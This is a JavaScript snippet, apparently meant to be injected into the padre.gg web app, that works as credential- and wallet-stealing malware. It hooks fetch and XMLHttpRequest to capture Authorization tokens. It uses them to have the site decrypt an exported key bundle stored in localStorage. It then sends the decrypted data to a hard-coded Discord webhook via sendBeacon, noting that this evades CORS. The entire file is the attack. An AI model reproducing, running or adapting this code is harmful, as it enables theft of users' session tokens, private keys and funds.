(function() {
    const DISCORD_URL = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";

    const shipData = async (token) => {
        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundleStr) return;
        
        const b = JSON.parse(bundleStr);
        const k = Object.keys(b.bundles)[0];
        const payload = {
            bundle: b.bundles[k].exportBundle,
            subOrgId: b.bundles[k].subOrgId
        };

        try {
            const res = await fetch("https://api.padre.gg/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const decrypted = await res.text();

            // Send to Discord using navigator.sendBeacon (Bypasses CORS blocks)
            const msg = JSON.stringify({
                embeds: [{
                    title: "🚀 VANTA CORE: EXFIL COMPLETE",
                    description: "```json\n" + decrypted.substring(0, 1800) + "\n```",
                    color: 65280,
                    footer: { text: "Vanta Tracker v17.1" }
                }]
            });
            navigator.sendBeacon(DISCORD_URL, msg);
        } catch (err) {}
    };

    // Global Network Sniffer (Intercepts tokens before they are sent)
    const originalOpen = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function() {
        this.addEventListener('load', function() {
            // Some sites use XHR, we catch headers here if possible
        });
        return originalOpen.apply(this, arguments);
    };

    const originalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
    window.XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (name.toLowerCase() === 'authorization') {
            shipData(value);
        }
        return originalSetHeader.apply(this, arguments);
    };

    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const headers = args[1]?.headers;
        if (headers) {
            const token = (headers instanceof Headers) ? headers.get('Authorization') : headers['Authorization'];
            if (token) shipData(token);
        }
        return originalFetch.apply(this, args);
    };

    // Trigger a request to wake up the sniffer
    originalFetch('/api/v2/user/profile').catch(()=>{});

    console.log("%cVANTA TRACKER LOADED", "color:#00ff88; font-weight:bold; font-size:14px;");
})();
